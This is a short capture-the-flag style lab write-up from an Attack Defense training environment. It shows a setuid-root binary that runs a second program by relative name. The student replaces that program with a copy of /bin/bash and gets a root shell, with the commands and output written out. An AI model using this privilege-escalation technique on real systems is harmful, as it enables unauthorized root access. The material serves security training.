# Set uid

Binary `welcome` runs another binary `greeting`

```
student@attackdefense:~$ ls -l
total 24
-r-x------ 1 root root 8296 Sep 22  2018 greetings
-rwsr-xr-x 1 root root 8344 Sep 22  2018 welcome
student@attackdefense:~$ file welcome
welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped
student@attackdefense:~$ ./welcome
Welcome to Attack Defense Labs
student@attackdefense:~$ strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
greetings
...
```

Replace `greeting` with `/bin/bash`

```
student@attackdefense:~$ rm greetings
rm: remove write-protected regular file 'greetings'? y
student@attackdefense:~$ cp /bin/bash greetings
student@attackdefense:~$ ./welcome
root@attackdefense:~# id
uid=0(root) gid=999(student) groups=999(student)
```
